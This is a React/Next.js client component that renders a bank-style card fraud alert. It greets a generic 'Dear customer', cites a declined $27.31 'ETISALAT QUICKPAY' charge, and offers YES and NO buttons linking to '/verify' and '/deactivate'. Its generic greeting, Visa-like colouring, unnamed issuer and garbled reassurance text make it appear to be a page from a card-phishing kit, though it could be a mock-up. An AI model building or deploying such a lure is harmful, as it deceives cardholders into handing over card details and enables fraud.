'use client';

import { Button } from "@/components/ui/button";
import { Link } from "next-view-transitions";

export default function Client() {
    return (
        <div className="w-full h-full p-4 pt-8">
            <h1 className="text-3xl font-semibold">Dear customer</h1>
            <p className="mt-6">Did you or someone you authorized use your debit or ATM card for:</p>
            <h2 className="text-lg font-semibold mt-1">Declined Transaction</h2>
            <h3 className="text-2xl font-semibold mt-4">ETISALAT QUICKPAY&nbsp;&nbsp;&nbsp;$27.31</h3>

            <div className="mt-16 flex flex-row gap-6">
                <div className="flex flex-col gap-2 flex-1">
                    <Link href="/verify">
                        <Button className="w-full bg-[#1434CB]">YES</Button>
                    </Link>
                    <ul className="list-disc list-inside text-sm text-neutral-500">
                        <li>Your card remains active.</li>
                        <li>If a purchase was declined, you will not be charged again unless you try again.</li>
                    </ul>
                </div>
                <div className="flex flex-col gap-2 flex-1">
                    <Link href="/deactivate">
                        <Button variant="outline" className="w-full">NO</Button>
                    </Link>
                    <p className="text-sm text-neutral-500">We will close your current card and send you will be issued a new one.</p>
                </div>
            </div>
        </div>
    );
}
